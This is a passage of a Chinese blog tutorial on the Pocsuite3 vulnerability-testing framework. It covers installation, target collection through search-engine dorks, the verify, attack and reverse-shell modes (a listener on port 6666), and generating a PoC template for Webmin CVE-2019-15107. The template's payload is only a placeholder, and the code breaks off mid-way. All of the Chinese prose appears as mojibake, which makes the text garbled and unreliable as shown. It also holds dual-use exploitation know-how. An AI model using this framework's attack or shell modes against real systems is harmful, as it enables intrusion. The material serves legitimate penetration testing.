å®‰è£…" class="headerlink" title="2.5 æºç å®‰è£…"></a>2.5 æºç å®‰è£…</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/knownsec/pocsuite3/archive/master.zip<span class="token function">unzip</span> master.zip<span class="token builtin class-name">cd</span> pocsuite3-masterpip3 <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython3 setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸‰ã€æ¶æ„"><a href="#ä¸‰ã€æ¶æ„" class="headerlink" title="ä¸‰ã€æ¶æ„"></a>ä¸‰ã€æ¶æ„</h1><p>å››å¤§æ¨¡å—ï¼šç›®æ ‡æ”¶é›†ã€PoC æ’ä»¶åŠ è½½ã€å¤šçº¿ç¨‹æ£€æµ‹ã€ç»“æœæ±‡æ€»ã€‚</p><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2016.35.17.png" alt="pocsuiteæ•´ä½“æ¡†æ¶" style="zoom:80%;"><h2 id="3-1-ç›®æ ‡æ”¶é›†"><a href="#3-1-ç›®æ ‡æ”¶é›†" class="headerlink" title="3.1 ç›®æ ‡æ”¶é›†"></a>3.1 ç›®æ ‡æ”¶é›†</h2><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹ç›®æ ‡æ”¶é›†ï¼Œç›®å‰æ”¯æŒä»¥ä¸‹æ–¹å¼ï¼š</p><ul><li><code>-u</code> æŒ‡å®šå•ä¸ª URL æˆ–è€… CIDRï¼Œæ”¯æŒ IPv4 / IPv6ã€‚ä½¿ç”¨ <code>-p</code> å‚æ•°å¯ä»¥æä¾›é¢å¤–çš„ç«¯å£ï¼Œé…åˆ CIDR å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ¢æµ‹ä¸€ä¸ªç›®æ ‡ç½‘æ®µ</li><li><code>-f</code> æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œå°†å¤šä¸ª URL/CIDR å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæ¯è¡Œä¸€ä¸ª</li><li><code>--dork</code>ï¼Œæ¡†æ¶é›†æˆäº† ZoomEyeã€Shodan ç­‰å¸¸è§ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼Œåªéœ€è¦ä½¿ç”¨ç›¸åº”çš„å‚æ•°æä¾›æœç´¢å…³é”®è¯å’Œ <code>API-KEY</code> å³å¯è‡ªåŠ¨å¯¼å…¥ç›®æ ‡ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥å°†æœç´¢å…³é”®è¯æ”¾åˆ° PoC æ’ä»¶çš„ dork å±æ€§ä¸­</li><li><code>--plugins</code> è°ƒç”¨æ’ä»¶åŠ è½½ç›®æ ‡ï¼Œæ¯”å¦‚ <code>target_from_redis</code>ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ TARGETS ç±»å‹æ’ä»¶</li></ul><h2 id="3-2-PoC-æ’ä»¶åŠ è½½"><a href="#3-2-PoC-æ’ä»¶åŠ è½½" class="headerlink" title="3.2 PoC æ’ä»¶åŠ è½½"></a>3.2 PoC æ’ä»¶åŠ è½½</h2><ul><li><code>-r</code> é€‰é¡¹æ”¯æŒæŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ª PoC è·¯å¾„ï¼ˆæˆ–ç›®å½•ï¼‰ï¼Œå¦‚æœæä¾›çš„æ˜¯ç›®å½•ï¼Œæ¡†æ¶å°†éå†ç›®å½•ç„¶ååŠ è½½æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ PoCï¼Œç”¨æˆ·å¯ä»¥ç”¨ <code>-k</code> é€‰é¡¹æŒ‡å®šå…³é”®è¯å¯¹ PoC è¿›è¡Œç­›é€‰ï¼Œå¦‚ç»„ä»¶åç§°ã€CVEç¼–å·ç­‰ã€‚å¦‚æœæˆ‘ä»¬ç¡®è®¤äº†ç›®æ ‡ç»„ä»¶ï¼Œå°±å¯ä»¥ç”¨ <code>-k</code> é€‰é¡¹æ‰¾åˆ°æ‰€ä»¥å¯¹åº”çš„ PoC å¯¹ç›®æ ‡è¿›è¡Œæ‰¹é‡æµ‹è¯•ã€‚å¦‚æœåªæä¾›äº† <code>-k</code> é€‰é¡¹ï¼Œ<code>-r</code> é»˜è®¤ä¸º Pocsuite3 è‡ªå¸¦çš„ <code>pocsuite3/pocs</code> ç›®å½•</li><li><code>--plugins</code> è°ƒç”¨æ’ä»¶åŠ è½½ PoCï¼Œæ¯”å¦‚ <code>poc_from_seebug</code>ã€<code>poc_from_redis</code>ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ POCS ç±»å‹æ’ä»¶</li></ul><h2 id="3-3-å¤šçº¿ç¨‹æ£€æµ‹"><a href="#3-3-å¤šçº¿ç¨‹æ£€æµ‹" class="headerlink" title="3.3 å¤šçº¿ç¨‹æ£€æµ‹"></a>3.3 å¤šçº¿ç¨‹æ£€æµ‹</h2><ul><li><p>å½“ç”¨æˆ·æŒ‡å®šäº†ç›®æ ‡å’Œ PoC åï¼Œæ¡†æ¶ä¼šå°†æ¯ä¸ªç›®æ ‡å’Œ PoC è¿›è¡ŒåŒ¹é…ï¼ˆç¬›å¡å°”ç§¯ï¼‰ï¼Œç”Ÿæˆä¸€ä¸ªå…ƒç´ ä¸º <code>(target, poc_module)</code> çš„é˜Ÿåˆ—ï¼Œç„¶åèµ·ä¸€ä¸ªé»˜è®¤å¤§å°ä¸º 150ï¼ˆå¯é€šè¿‡ <code>--threads</code> è®¾ç½®ï¼‰ çš„çº¿ç¨‹æ± å¤„ç†è¿™ä¸ªé˜Ÿåˆ—ã€‚</p></li><li><p>åœ¨ Pocsuite3 ä¸­ï¼ŒPoC æ’ä»¶æœ‰ä¸‰ç§è¿è¡Œæ¨¡å¼ï¼Œåˆ†åˆ«å¯¹åº” PoC æ’ä»¶ä¸­å®šä¹‰çš„ä¸‰ç§æ–¹æ³•ï¼Œå¯ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•° <code>--verify</code>ã€<code>--attack</code>ã€<code>--shell</code> å†³å®šæ‰§è¡Œå“ªç§æ–¹æ³•ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤æ˜¯ <code>--verify</code>ã€‚</p></li><li><p>çº¿ç¨‹è¦åšçš„å°±æ˜¯ä»¥ target ä¸ºå‚æ•°åˆå§‹åŒ– PoC æ’ä»¶å¹¶æ‰§è¡ŒæŒ‡å®šæ–¹æ³•ï¼Œç„¶åè·å–æ‰§è¡Œç»“æœã€‚</p></li></ul><h2 id="3-4-ç»“æœæ±‡æ€»"><a href="#3-4-ç»“æœæ±‡æ€»" class="headerlink" title="3.4 ç»“æœæ±‡æ€»"></a>3.4 ç»“æœæ±‡æ€»</h2><p>ä¸Šä¸€æ­¥è·å–äº†æ‰§è¡Œç»“æœåï¼Œæ¡†æ¶æä¾›äº†å¤šç§æ–¹æ³•å¯¹ç»“æœè¿›è¡Œå¤„ç†å¹¶ä¿å­˜ï¼š</p><ul><li>æ§åˆ¶å°æ—¥å¿—ï¼Œ<code>-v</code> å‚æ•°æ§åˆ¶æ—¥å¿—çº§åˆ«ï¼Œ<code>--ppt</code> å‚æ•°å¯ä»¥å¯¹ IP åœ°å€é©¬èµ›å…‹å¤„ç†ï¼Œæ–¹ä¾¿å½•å±</li><li><code>-o</code> å‚æ•°å°†è¿è¡Œç»“æœä¿å­˜ä¸º JSON Lines æ ¼å¼çš„æ–‡ä»¶</li><li><code>--plugins</code> è°ƒç”¨æ’ä»¶å¯¹ç»“æœè¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚ï¼š<code>file_record</code>ï¼Œ<code>html_report</code>ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ RESULTS ç±»å‹æ’ä»¶</li></ul><h1 id="å››ã€è¿è¡Œæ¨¡å¼"><a href="#å››ã€è¿è¡Œæ¨¡å¼" class="headerlink" title="å››ã€è¿è¡Œæ¨¡å¼"></a>å››ã€è¿è¡Œæ¨¡å¼</h1><p>Pocsuite3 æœ‰ä¸‰ç§è¿è¡Œæ–¹æ³•ï¼Œ1ã€å‘½ä»¤è¡Œï¼›2ã€äº¤äº’å¼æ§åˆ¶å°ï¼›3ã€é›†æˆè°ƒç”¨ã€‚</p><h2 id="4-1-å‘½ä»¤è¡Œ"><a href="#4-1-å‘½ä»¤è¡Œ" class="headerlink" title="4.1 å‘½ä»¤è¡Œ"></a>4.1 å‘½ä»¤è¡Œ</h2><p>ç›´æ¥è¿è¡Œ pocsuite å‘½ä»¤ï¼Œå¹¶ä½¿ç”¨å¯¹åº”å‚æ•°æŒ‡å®šå¾…æµ‹è¯•çš„ç›®æ ‡å’Œ PoCã€‚</p><h2 id="4-2-äº¤äº’å¼æ§åˆ¶å°"><a href="#4-2-äº¤äº’å¼æ§åˆ¶å°" class="headerlink" title="4.2 äº¤äº’å¼æ§åˆ¶å°"></a>4.2 äº¤äº’å¼æ§åˆ¶å°</h2><p>ç±»ä¼¼ Metasploit çš„æ§åˆ¶å°ï¼Œä½¿ç”¨ <code>poc-console</code> å‘½ä»¤è¿›å…¥ã€‚</p><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2017.16.20.png" style="zoom:50%;"><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2017.19.52.png" style="zoom:50%;"><h2 id="4-3-é›†æˆè°ƒç”¨"><a href="#4-3-é›†æˆè°ƒç”¨" class="headerlink" title="4.3 é›†æˆè°ƒç”¨"></a>4.3 é›†æˆè°ƒç”¨</h2><p>å½“æˆä¸€ä¸ªæ¨¡å—æ¥ä½¿ç”¨ã€‚</p><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2017.20.34.png" alt="æˆªå±2025-01-20 17.20.34" style="zoom:40%;"><h1 id="äº”ã€-å¦‚ä½•ç¼–å†™-PoC"><a href="#äº”ã€-å¦‚ä½•ç¼–å†™-PoC" class="headerlink" title="äº”ã€ å¦‚ä½•ç¼–å†™ PoC"></a>äº”ã€ å¦‚ä½•ç¼–å†™ PoC</h1><p>æ¡†æ¶åªæ˜¯èº¯å£³ï¼ŒPoC æ‰æ˜¯çµé­‚ã€‚</p><p>Pocsuite3 å¯ä»¥é€šè¿‡ <code>-n</code> æˆ– <code>--new</code> å‚æ•°è‡ªåŠ¨ç”Ÿæˆ PoC æ¨¡ç‰ˆã€‚</p><h2 id="5-1-PoC-æ’ä»¶çš„ä¸‰ç§æ¨¡å¼"><a href="#5-1-PoC-æ’ä»¶çš„ä¸‰ç§æ¨¡å¼" class="headerlink" title="5.1 PoC æ’ä»¶çš„ä¸‰ç§æ¨¡å¼"></a>5.1 PoC æ’ä»¶çš„ä¸‰ç§æ¨¡å¼</h2><p>1ã€verify æ¨¡å¼ï¼ŒéªŒè¯æ¼æ´å­˜åœ¨ã€‚éªŒè¯æ–¹å¼å–å†³äºå…·ä½“çš„æ¼æ´ç±»å‹ï¼Œæ¯”å¦‚æ£€æŸ¥ç›®æ ‡çš„è½¯ä»¶ç‰ˆæœ¬ã€åˆ¤æ–­æŸä¸ªå…³é”® API çš„çŠ¶æ€ç æˆ–è¿”å›ã€è¯»å–ç‰¹å®šæ–‡ä»¶ã€æ‰§è¡Œä¸€ä¸ªå‘½ä»¤å¹¶è·å–ç»“æœï¼Œç»“åˆ DNSLog å¸¦å¤–å›æ˜¾ç­‰ã€‚è¯¥æ¨¡å¼ç”¨äºæ‰¹é‡æ¼æ´æ’æŸ¥ï¼Œä¸€èˆ¬ä¸éœ€è¦ç”¨æˆ·æä¾›é¢å¤–å‚æ•° ï¼Œä¸”åº”å°½å¯èƒ½å¯¹ç›®æ ‡æ— å®³ã€‚</p><p>2ã€attack æ¨¡å¼ï¼Œæ”»å‡»æ¨¡å¼ï¼Œå¯å®ç°æŸç§ç‰¹å®šéœ€æ±‚ã€‚æ¯”å¦‚è·å–ç‰¹å®šæ•°æ®ã€å†™å…¥ä¸€å¥è¯å¹¶è¿”å› shell åœ°å€ã€ä»å‘½ä»¤è¡Œå‚æ•°è·å–å‘½ä»¤å¹¶æ‰§è¡Œã€ä»å‘½ä»¤è¡Œå‚æ•°è·å–æ–‡ä»¶è·¯å¾„å¹¶è¿”å›æ–‡ä»¶å†…å®¹ç­‰ã€‚</p><p>3ã€shell æ¨¡å¼ï¼Œè·å–äº¤äº’å¼ shellï¼Œæ­¤æ¨¡å¼ä¸‹ä¼šé»˜è®¤ç›‘å¬æœ¬æœºçš„ 6666 ç«¯å£ï¼ˆå¯é€šè¿‡ <code>--lhost</code>ã€<code>--lport</code> å‚æ•°ä¿®æ”¹ï¼‰ï¼Œç¼–å†™å¯¹åº”çš„ä»£ç ï¼Œè®©ç›®æ ‡æ‰§è¡Œåè¿ Payload åå‘è¿æ¥åˆ°è®¾å®šçš„ IP å’Œç«¯å£å³å¯å¾—åˆ°ä¸€ä¸ª shellã€‚</p><p>åè¿ Payload å¯å‚è€ƒï¼š[GTFOBins Reverse shell](<a href="https://gtfobins.github.io/#+reverse">https://gtfobins.github.io/#+reverse</a> shell)ã€‚</p><p>åœ¨ PoC æ’ä»¶ä¸­ï¼Œattack æ¨¡å¼å’Œ shell æ¨¡å¼çš„å®ç°æ˜¯å¯é€‰çš„ã€‚</p><h2 id="5-2-PoC-æ’ä»¶åŸºç±»"><a href="#5-2-PoC-æ’ä»¶åŸºç±»" class="headerlink" title="5.2 PoC æ’ä»¶åŸºç±»"></a>5.2 PoC æ’ä»¶åŸºç±»</h2><p>ä¸ºäº†ç®€åŒ– PoC æ’ä»¶çš„ç¼–å†™ï¼ŒPocsuite3 å®ç°äº† PoC åŸºç±»ï¼š<code>POCBase</code>ï¼Œå¾ˆå¤šå…±ç”¨çš„ä»£ç ç‰‡æ®µéƒ½å¯ä»¥æ”¾åˆ°æ­¤åŸºç±»ä¸­ã€‚æˆ‘ä»¬ç¼–å†™ PoC æ—¶ï¼Œåªéœ€è¦ç»§æ‰¿è¯¥åŸºç±»å°±å¯ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„å±æ€§å’Œæ–¹æ³•å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">å¸¸ç”¨å±æ€§ï¼šself<span class="token punctuation">.</span>url  <span class="token comment"># ç›®æ ‡ url</span>self<span class="token punctuation">.</span>scheme  <span class="token comment"># ç›®æ ‡ url çš„åè®®</span>self<span class="token punctuation">.</span>rhost  <span class="token comment"># ç›®æ ‡ url çš„ä¸»æœºå</span>self<span class="token punctuation">.</span>rport  <span class="token comment"># ç›®æ ‡ url çš„ç«¯å£</span>self<span class="token punctuation">.</span>host_ip  <span class="token comment"># æœ¬æœºçš„ wan å£ ip</span>å¸¸ç”¨æ–¹æ³•ï¼šself<span class="token punctuation">.</span>_check<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ç«¯å£å¼€æ”¾æ£€æŸ¥ã€http/https åè®®è‡ªåŠ¨çº æ­£ã€dork æ£€æŸ¥ã€èœœç½æ£€æŸ¥</span>self<span class="token punctuation">.</span>get_option<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>  <span class="token comment"># è·å–å‘½ä»¤è¡Œå‚æ•° --key çš„å€¼</span>self<span class="token punctuation">.</span>parse_output<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment"># è¿”å›ç»“æœçš„æ–¹æ³•ï¼Œå‚æ•°æ˜¯ä¸€ä¸ªå­—å…¸</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-3-æ¡ˆä¾‹ï¼šWebmin-æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-15107ï¼‰"><a href="#5-3-æ¡ˆä¾‹ï¼šWebmin-æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-15107ï¼‰" class="headerlink" title="5.3 æ¡ˆä¾‹ï¼šWebmin æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-15107ï¼‰"></a>5.3 æ¡ˆä¾‹ï¼šWebmin æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-15107ï¼‰</h2><p>Webmin æ˜¯åŠŸèƒ½å¼ºå¤§çš„åŸºäº Web çš„ Unix ç³»ç»Ÿç®¡ç†å·¥å…·ï¼Œç®¡ç†å‘˜å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—® Webmin çš„å„ç§ç®¡ç†åŠŸèƒ½å¹¶å®Œæˆç›¸åº”çš„ç®¡ç†åŠ¨ä½œã€‚<code>Webmin &lt;= 1.920</code> ç‰ˆæœ¬çš„ <code>/password_change.cgi</code> æ¥å£å­˜åœ¨ä¸€å¤„æœªæˆæƒå‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p><p>åŸºäºç½‘ä¸Šå…¬å¼€çš„æ¼æ´ç»†èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„å¼€å‘å‡ºè¯¥æ¼æ´çš„ PoC æ’ä»¶ã€‚</p><ul><li>é¦–å…ˆä½¿ç”¨ <code>--new</code> å‚æ•°ç”Ÿæˆ PoC æ¨¡ç‰ˆï¼ˆå¦‚æœå«Œå±æ€§æ¯”è¾ƒå¤šï¼Œä¸€è·¯å›è½¦å³å¯ï¼‰ï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â†’pocsuite <span class="token parameter variable">--new</span><span class="token punctuation">..</span>.You are about to be asked to enter information that will be used to create a poc template.There are quite a few fields but you can leave some blank.For some fields there will be a default value.-----Seebug ssvid <span class="token punctuation">(</span>eg, <span class="token number">99335</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>: <span class="token number">98060</span>  <span class="token comment"># Seebug æ¼æ´æ”¶å½•IDï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º0</span>PoC author <span class="token punctuation">(</span>eg, Seebug<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>: Seebug  <span class="token comment"># PoC çš„ä½œè€…</span>Vulnerability disclosure <span class="token function">date</span> <span class="token punctuation">(</span>eg, <span class="token number">2021</span>-8-18<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">2022</span>-07-11<span class="token punctuation">]</span>: <span class="token number">2019</span>-08-19  <span class="token comment"># æ¼æ´å…¬å¼€æ—¥æœŸ</span>Advisory URL <span class="token punctuation">(</span>eg, https://www.seebug.org/vuldb/ssvid-99335<span class="token punctuation">)</span> <span class="token punctuation">[</span>https://www.seebug.org/vuldb/ssvid-98060<span class="token punctuation">]</span>:  <span class="token comment"># æ¼æ´æ¥æºåœ°å€</span>Vulnerability CVE number <span class="token punctuation">(</span>eg, CVE-2021-22123<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>: CVE-2019-15107  <span class="token comment"># CVE ç¼–å·</span>Vendor name <span class="token punctuation">(</span>eg, Fortinet<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>:  <span class="token comment"># å‚å•†åç§°</span>Product or component name <span class="token punctuation">(</span>eg, FortiWeb<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>: Webmin  <span class="token comment"># æ¼æ´åº”ç”¨åç§°</span>Affected version <span class="token punctuation">(</span>eg, <span class="token operator">&lt;=</span><span class="token number">6.4</span>.0<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>: <span class="token operator">&lt;=</span><span class="token number">1.920</span>  <span class="token comment"># æ¼æ´å½±å“ç‰ˆæœ¬</span>Vendor homepage <span class="token punctuation">(</span>eg, https://www.fortinet.com<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>: https://www.webmin.com  <span class="token comment"># å‚å•†å®˜ç½‘</span><span class="token number">0</span>    Arbitrary File Read<span class="token number">1</span>    Code Execution<span class="token number">2</span>    Command Execution<span class="token number">3</span>    Denial Of <span class="token function">service</span><span class="token number">4</span>    Information Disclosure<span class="token number">5</span>    Login Bypass<span class="token number">6</span>    Path Traversal<span class="token number">7</span>    SQL Injection<span class="token number">8</span>    SSRF<span class="token number">9</span>    XSSVulnerability type, choose from above or provide <span class="token punctuation">(</span>eg, <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>: <span class="token number">2</span>  <span class="token comment"># é€‰æ‹©æ¼æ´ç±»å‹</span>Authentication Required <span class="token punctuation">(</span>eg, <span class="token function">yes</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>no<span class="token punctuation">]</span>: no  <span class="token comment"># æ¼æ´æ˜¯å¦éœ€è¦è®¤è¯</span>Can we get result of <span class="token builtin class-name">command</span> <span class="token punctuation">(</span>eg, <span class="token function">yes</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>no<span class="token punctuation">]</span>: <span class="token function">yes</span>  <span class="token comment"># æ˜¯å¦å¯ä»¥è·å–å‘½ä»¤æ‰§è¡Œç»“æœ</span>PoC name <span class="token punctuation">[</span>Webmin <span class="token operator">&lt;=</span><span class="token number">1.920</span> Pre-Auth Command Execution <span class="token punctuation">(</span>CVE-2019-15107<span class="token punctuation">)</span><span class="token punctuation">]</span>:  <span class="token comment"># PoC åç§°</span>Filepath <span class="token keyword">in</span> <span class="token function">which</span> to save the poc <span class="token punctuation">[</span>./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py<span class="token punctuation">]</span>  <span class="token comment"># ä¿å­˜ PoC çš„æ–‡ä»¶è·¯å¾„</span><span class="token punctuation">[</span><span class="token number">14</span>:50:49<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Your poc has been saved <span class="token keyword">in</span> ./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆçš„ PoC æ¨¡ç‰ˆå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># å»ºè®®ç»Ÿä¸€ä» pocsuite3.api å¯¼å…¥</span><span class="token keyword">from</span> pocsuite3<span class="token punctuation">.</span>api <span class="token keyword">import</span> <span class="token punctuation">(</span>    minimum_version_required<span class="token punctuation">,</span> POCBase<span class="token punctuation">,</span> register_poc<span class="token punctuation">,</span> requests<span class="token punctuation">,</span> logger<span class="token punctuation">,</span>    OptString<span class="token punctuation">,</span> OrderedDict<span class="token punctuation">,</span>    random_str<span class="token punctuation">,</span>    get_listener_ip<span class="token punctuation">,</span> get_listener_port<span class="token punctuation">,</span> REVERSE_PAYLOAD<span class="token punctuation">)</span><span class="token comment"># é™å®šæ¡†æ¶ç‰ˆæœ¬ï¼Œé¿å…åœ¨è€çš„æ¡†æ¶ä¸Šè¿è¡Œæ–°çš„ PoC æ’ä»¶</span>minimum_version_required<span class="token punctuation">(</span><span class="token string">'1.9.6'</span><span class="token punctuation">)</span><span class="token comment"># DemoPOC ç±»ï¼Œç»§æ‰¿è‡ªåŸºç±» POCBase</span><span class="token keyword">class</span> <span class="token class-name">DemoPOC</span><span class="token punctuation">(</span>POCBase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># PoC å’Œæ¼æ´çš„å±æ€§ä¿¡æ¯</span>    vulID <span class="token operator">=</span> <span class="token string">'98060'</span>    version <span class="token operator">=</span> <span class="token string">'1'</span>    author <span class="token operator">=</span> <span class="token string">'Seebug'</span>    vulDate <span class="token operator">=</span> <span class="token string">'2019-08-19'</span>    createDate <span class="token operator">=</span> <span class="token string">'2022-07-11'</span>    updateDate <span class="token operator">=</span> <span class="token string">'2022-07-11'</span>    references <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.seebug.org/vuldb/ssvid-98060'</span><span class="token punctuation">]</span>    name <span class="token operator">=</span> <span class="token string">'Webmin &lt;=1.920 Pre-Auth Command Execution (CVE-2019-15107)'</span>    appPowerLink <span class="token operator">=</span> <span class="token string">'https://www.webmin.com'</span>    appName <span class="token operator">=</span> <span class="token string">'Webmin'</span>    appVersion <span class="token operator">=</span> <span class="token string">'&lt;=1.920'</span>    vulType <span class="token operator">=</span> <span class="token string">'Command Execution'</span>    desc <span class="token operator">=</span> <span class="token string">'Vulnerability description'</span>    samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>  <span class="token comment"># æµ‹è¯•æ ·åˆ—ï¼Œå°±æ˜¯ç”¨ PoC æµ‹è¯•æˆåŠŸçš„ç›®æ ‡</span>    install_requires <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>  <span class="token comment"># PoC ç¬¬ä¸‰æ–¹æ¨¡å—ä¾èµ–</span>    pocDesc <span class="token operator">=</span> <span class="token string">'User manual of poc'</span>    <span class="token comment"># æœç´¢ dorkï¼Œå¦‚æœè¿è¡Œ PoC æ—¶ä¸æä¾›ç›®æ ‡ä¸”è¯¥å­—æ®µä¸ä¸ºç©ºï¼Œå°†ä¼šè°ƒç”¨æ’ä»¶ä»æœç´¢å¼•æ“è·å–ç›®æ ‡ã€‚</span>    dork <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'zoomeye'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span>    suricata_request <span class="token operator">=</span> <span class="token string">''</span>    suricata_response <span class="token operator">=</span> <span class="token string">''</span>    <span class="token comment"># å®šä¹‰é¢å¤–çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œç”¨äº attack æ¨¡å¼</span>    <span class="token keyword">def</span> <span class="token function">_options</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        o <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token punctuation">)</span>        o<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span> <span class="token operator">=</span> OptString<span class="token punctuation">(</span><span class="token string">'uname -a'</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">'The command to execute'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> o    <span class="token comment"># æ¼æ´çš„æ ¸å¿ƒæ–¹æ³•</span>    <span class="token keyword">def</span> <span class="token function">_exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> param<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># ä½¿ç”¨ self._check() æ–¹æ³•æ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜æ´»ï¼Œæ˜¯å¦æ˜¯å…³é”®è¯èœœç½ã€‚</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>_check<span class="token punctuation">(</span>dork<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span>        payload <span class="token operator">=</span> <span class="token string">'a=b'</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>        logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>text    <span class="token comment"># verify æ¨¡å¼çš„å®ç°</span>    <span class="token keyword">def</span> <span class="token function">_verify</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        flag <span class="token operator">=</span> random_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        param <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'echo </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">'</span></span>        res <span class="token operator">=</span> self<span class="token punctuation">.</span>_exploit<span class="token punctuation">(</span>param<span class="token punctuation">)</span>        <span class="token keyword">if</span> res <span class="token keyword">and</span> flag <span class="token keyword">in</span> res<span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token 